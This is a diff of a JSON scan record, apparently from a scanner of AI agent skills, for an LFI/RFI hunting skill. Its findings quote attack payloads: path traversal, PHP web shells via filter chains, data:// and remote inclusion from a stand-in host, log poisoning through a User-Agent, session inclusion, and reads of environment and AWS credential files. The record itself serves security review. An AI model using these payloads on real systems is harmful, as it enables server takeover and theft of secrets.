@@ -5,15 +5,15 @@
   "path": "skills/hunt-lfi",
   "name": "hunt-lfi",
   "description": "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target.",
-  "stars": 5465,
+  "stars": 5490,
   "category": "security",
-  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "commit": "42a3ab1bb96426beb98f964d178695c1144c61ea",
   "contentHash": "9862893cf3c2d8cd798be7be81188aa6a02fd20471126ef3d289bf770f9dedd3",
   "repoCreatedAt": "2026-05-05T11:22:32Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scannedAt": "2026-11-08T05:42:07.685Z",
   "scan": {
     "findings": [
       {
@@ -35,8 +35,8 @@
       {
         "ruleId": "shell",
         "file": "skills/hunt-lfi/SKILL.md",
-        "line": 93,
-        "excerpt": "# Windows",
+        "line": 94,
+        "excerpt": "?file=..\\..\\..\\windows\\win.ini",
         "disclosed": false,
         "automatic": false
       },
@@ -51,32 +51,24 @@
       {
         "ruleId": "shell",
         "file": "skills/hunt-lfi/SKILL.md",
-        "line": 111,
-        "excerpt": "# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):",
+        "line": 113,
+        "excerpt": "python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"c\"]); ?>'",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/hunt-lfi/SKILL.md",
-        "line": 126,
-        "excerpt": "# data:// — executes inline; REQUIRES allow_url_include=On",
+        "line": 127,
+        "excerpt": "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/hunt-lfi/SKILL.md",
-        "line": 140,
-        "excerpt": "# Host a payload you control, then:",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/hunt-lfi/SKILL.md",
-        "line": 151,
-        "excerpt": "# Step 1: inject PHP into a log the include can read",
+        "line": 141,
+        "excerpt": "?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>",
         "disclosed": false,
         "automatic": false
       },
@@ -94,8 +86,16 @@
       {
         "ruleId": "shell",
         "file": "skills/hunt-lfi/SKILL.md",
-        "line": 163,
-        "excerpt": "# PHP session: set payload in a stored field (username/profile), then include the session file",
+        "line": 152,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"User-Agent: <?php system(\\$_GET['c']); ?>\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-lfi/SKILL.md",
+        "line": 164,
+        "excerpt": "?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id",
         "disclosed": false,
         "automatic": false
       },
@@ -124,14 +124,6 @@
         "automatic": false
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "skills/hunt-lfi/SKILL.md",
-        "line": 240,
-        "excerpt": "| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
         "ruleId": "network",
         "file": "skills/hunt-lfi/SKILL.md",
         "line": 261,
@@ -144,11 +136,11 @@
     "findingTotals": {
       "shell": 10,
       "network": 2,
-      "reads-secrets": 3
+      "reads-secrets": 2
     },
     "score": 72,
     "band": "review",
-    "rulesVersion": "1.0.0",
+    "rulesVersion": "1.3.0",
     "filesScanned": 2,
     "filesSkipped": 0
   },
@@ -158,6 +150,12 @@
       "scannedAt": "2026-11-06T19:07:48.007Z",
       "score": 72,
       "rulesVersion": "1.0.0"
+    },
+    {
+      "commit": "42a3ab1bb96426beb98f964d178695c1144c61ea",
+      "scannedAt": "2026-11-08T05:42:07.685Z",
+      "score": 72,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
